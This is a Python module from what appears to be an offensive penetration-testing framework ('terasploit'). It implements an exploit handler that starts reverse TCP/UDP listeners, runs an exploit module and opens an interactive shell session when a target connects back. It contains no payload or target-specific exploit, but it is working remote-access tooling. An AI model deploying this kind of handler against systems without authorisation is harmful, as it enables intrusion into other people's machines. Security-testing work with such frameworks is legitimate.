#######
# Exploit: Handler
#######

import threading

from libs.terasploit.framework.info.info_container import module_info
from libs.terasploit.framework.exploit.aggregator import (
    listening_host,
    Shell
)
from libs.terasploit.framework.exploit.client import Session
from init.teralib.core import Get
from init.teralib.ui import print_info
from init.framework import (
    TCPClient,
    UDPClient
)
from libs.terasploit.framework.sessions.shell import (
    reverse_udp,
    reverse_tcp
)


class exploit_shell:
    
    @staticmethod
    def reverse_tcp():
        reverse_tcp.session_shell()
        
    
    @staticmethod
    def reverse_udp():
        reverse_udp.session_shell()


class client:
    """ Close function will try to connect on the listener and close the connection,
    this is to terminate the listener if the exploit failed and an exception was returned.
    """
    
    @staticmethod
    def reverse_tcp(lhost,lport):
        tcp_client = threading.Thread(target=TCPClient.Bind,args=[lhost,lport],daemon=True)
        return tcp_client
    
    
    @staticmethod
    def close_reverse_tcp(lhost,lport):
        TCPClient.Terminate(lhost,lport)
        setattr(Session,'client',None)
        setattr(Session,'received_connection',None)


    @staticmethod
    def reverse_udp(lhost,lport):
        udp_client = threading.Thread(target=UDPClient.Bind,args=[lhost,lport],daemon=True)
        return udp_client
    
    
    @staticmethod
    def close_reverse_udp(lhost,lport):
        UDPClient.Terminate(lhost,lport)
        setattr(Session,'client',None)
        setattr(Session,'received_connection',None)


class exploit_session:
    
    def __init__(self) -> None:
        """ starts exploit session """
        
        self.lhost, self.lport = listening_host()
        self.payload_handler = module_info.payload_info['PayloadHandler']
        self.start_exploit()
        

    def run_module(self) -> any:
        """ returns module status """
        
        return getattr(Get.module()[0],'exploit')
    
    
    def clear_client(self) -> None:
        """ clears the client container """
        
        setattr(Session,'client',None)
        setattr(Session,'received_connection',None)
    
    
    def start_exploit(self):
        try:
            session_client = getattr(client,self.payload_handler)(self.lhost,self.lport)
            session_client.start()
            
            status = self.run_module()()
            if status:
                if status.lower() == 'failed':
                    getattr(client,f"close_{self.payload_handler}")(self.lhost,self.lport)
                    self.clear_client()
                    print_info ('Listener terminated...')
                    return
            
            session_client.join()
            if Session.client:
                if Session.received_connection:
                    print_info (f"Connection received from {Session.received_connection[0]}:{Session.received_connection[1]}")
                getattr(exploit_shell,self.payload_handler)()
                self.clear_client()
                return
                    
            if not Session.client:
                print_info ("No connection has been made!",type="YELLOW")
                if Shell.get():
                    print_info ("If payload exist in target, try multi handler module to start a new listener with generic payload then manually execute payload on the target.")
                return
            
        except KeyboardInterrupt:
            print_info ("Client terminated!")
            getattr(client,f"close_{self.payload_handler}")(self.lhost,self.lport)
            return
        
        except Exception as error:
            print_info (error)
            return